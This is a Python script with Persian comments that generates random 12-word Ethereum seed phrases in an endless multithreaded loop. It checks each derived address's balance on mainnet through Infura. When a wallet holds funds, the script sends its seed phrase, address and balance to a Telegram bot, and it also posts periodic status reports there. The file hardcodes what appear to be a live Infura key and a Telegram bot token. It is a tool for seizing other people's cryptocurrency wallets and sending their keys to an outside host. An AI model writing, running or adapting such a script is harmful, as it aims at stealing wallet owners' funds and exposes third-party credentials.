import random
import time
from bip_utils import Bip39SeedGenerator, Bip39MnemonicGenerator, Bip44, Bip44Coins, Bip44Changes
from web3 import Web3
import concurrent.futures
import requests
from requests.exceptions import ConnectionError
import asyncio
from telegram import Bot

# تنظیمات اولیه برای اتصال به شبکه اتریوم
w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/a8a19c2e6ef649da802a35b5f89fcffe'))

# تنظیمات ربات تلگرام
bot_token = '7746856440:AAEhe2COOT5sfR2Ii41SH-3tuR-x3L6aJbc'
chat_id = '5738292802'
bot = Bot(token=bot_token)

# توابع اصلی
def check_balance(address):
    try:
        balance = w3.eth.get_balance(address)
        return w3.from_wei(balance, 'ether')
    except Exception as e:
        print(f"Error checking balance for address {address}: {e}")
        return None

def generate_seed_and_check_balance():
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(12)
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()

    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT)
    eth_address = bip44_acc_ctx.AddressIndex(0).PublicKey().ToAddress()

    balance = check_balance(eth_address)
    return mnemonic, eth_address, balance

async def send_telegram_message(message):
    await bot.send_message(chat_id=chat_id, text=message)

async def generate_and_check_seeds():
    total_checked = 0  # تعداد کل ولت‌های بررسی شده
    found_with_balance = 0  # تعداد ولت‌های دارای موجودی
    found_without_balance = 0  # تعداد ولت‌های بدون موجودی

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        while True:  # حلقه بی‌نهایت برای بررسی ولت‌ها
            futures = [executor.submit(generate_seed_and_check_balance) for _ in range(10)]
            for future in concurrent.futures.as_completed(futures):
                total_checked += 1
                try:
                    mnemonic, address, balance = future.result()

                    if balance is not None and balance > 0:
                        found_with_balance += 1
                        # ارسال پیام به ربات تلگرام اگر موجودی یافت شد
                        message = f"Seed phrase: {mnemonic}\nAddress: {address}\nBalance: {balance} ETH"
                        await send_telegram_message(message)
                    else:
                        found_without_balance += 1

                    # ارسال وضعیت به تلگرام در هر 10 هزار بررسی
                    if total_checked % 10000 == 0:
                        status_message = (f"Total checked: {total_checked}\n"
                                          f"With balance: {found_with_balance}\n"
                                          f"Without balance: {found_without_balance}")
                        await send_telegram_message(status_message)

                    # نمایش وضعیت در کنسول
                    print(f'Total checked: {total_checked}, With balance: {found_with_balance}, Without balance: {found_without_balance}')

                except ConnectionError as e:
                    print(f"Connection error occurred: {e}")
                    time.sleep(2)  # تلاش مجدد بعد از تأخیر
                except Exception as e:
                    print(f"An error occurred: {e}")

# اجرای کد
asyncio.run(generate_and_check_seeds())
